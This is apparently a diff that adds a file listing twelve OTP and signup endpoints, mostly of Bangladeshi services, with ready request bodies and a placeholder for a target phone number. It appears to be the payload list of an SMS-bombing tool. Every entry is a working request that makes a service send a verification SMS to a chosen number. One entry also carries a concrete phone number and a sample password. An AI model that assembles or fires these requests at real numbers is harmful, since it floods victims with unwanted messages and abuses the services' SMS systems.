@@ -1,0 +1,73 @@
+NOTE >> [ 016******** ] means a actual number 
+----------------------------------------------
+
+API-1 
+ https://www.bioscopelive.com/en/login/send-otp?phone=88016********&operator=bd-otp
+
+API - 2 
+
+https://api-v4-2.hungrynaki.com/graphql
+
+data
+
+{"query": "\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n", "variables": {"phone": "016********", "country": "880", "uuid": "64b9bb81-93f3-4757-9e92-9cfbf34d8039", "osVersionCode": "Linux armv8l", "deviceBrand": "Chrome", "deviceModel": "89", "requestFrom": "U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
+
+API-3 
+
+https://prod-api.viewlift.com/identity/signup?site=hoichoitv
+
+{
+  "requestType": "send",
+  "phoneNumber": "+88016********",
+  "emailConsent": "true",
+  "whatsappConsent": "true"
+}
+
+API - 4 
+
+https://api.redx.com.bd/v1/user/signup
+
+
+{"name": "016********", "phoneNumber": "1609258777", "service": "redx"}
+
+API -5 
+
+https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0016********
+
+API-6 
+https://api.osudpotro.com/api/v1/users/send_otp
+{"mobile": "+88-016********", "deviceToken": "web", "language": "en", "os": "web"}
+
+API-7 
+
+https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru
+
+{"phone_number": "+88016********"}
+
+API-8
+https://api.arogga.com/v1/auth/sms/send
+
+mobile=%2B88016********&fcmToken=&referral=
+
+
+API -9 
+
+https://api.shikho.com/auth/v2/send/sms
+
+{"phone": "016********", "type": "student", "auth_type": "signup", "vendor": "shikho"}
+
+API-10 
+
+https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web
+
+{"name": "Rahat Khan", "mobile_no": "016********", "password": "toxic@khan@#", "confirm_password": "toxic@khan@#"}
+
+API - 11
+
+https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=016******** 
+
+API - 12 
+
+https://fundesh.com.bd/api/auth/generateOTP?service_key=
+
+{"msisdn": "016******** "}
